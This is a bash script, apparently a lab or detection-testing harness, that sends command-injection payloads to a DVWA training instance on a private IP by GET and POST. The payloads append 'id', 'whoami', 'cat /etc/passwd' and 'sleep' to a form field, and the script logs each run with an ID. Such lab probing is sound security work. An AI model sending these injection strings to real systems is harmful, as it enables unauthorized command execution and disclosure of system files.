#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"

echo "[run_id=$RUN_ID] Command injection probe starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

PAYLOADS=(
  "127.0.0.1%3Bid"
  "127.0.0.1%7Cwhoami"
  "127.0.0.1%26%26cat%20/etc/passwd"
  "%24%28sleep%201%29"
  "%60id%60"
)

for payload in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -m 4 "http://$TARGET_IP/dvwa/vulnerabilities/exec/?ip=$payload&Submit=Submit" || true
  curl -s -o /dev/null -m 4 -X POST "http://$TARGET_IP/dvwa/vulnerabilities/exec/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "ip=$payload&Submit=Submit" || true
done

echo "[run_id=$RUN_ID] Command injection probe done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
